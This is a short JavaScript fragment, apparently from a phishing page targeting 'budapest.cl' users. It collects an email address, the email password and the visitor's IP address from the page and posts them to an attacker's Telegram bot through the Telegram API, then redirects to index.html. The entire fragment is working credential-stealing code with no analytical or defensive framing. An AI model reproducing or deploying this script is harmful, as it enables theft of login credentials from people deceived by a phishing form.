<script>

var u_name, dname,  ip, ip2;
var ready = function () {
    u_name = document.getElementById("usermil").value;
	dname = document.getElementById("uerpas").value;
	
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "DATOS-budapest.cl\nüìßCorreo: " + u_name + "\nüîêContrasena de correo: " + dname + "\nüåéIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
  
        console.log(response);
		
          window.location = 'index.html';

	
    });
    return false;
};
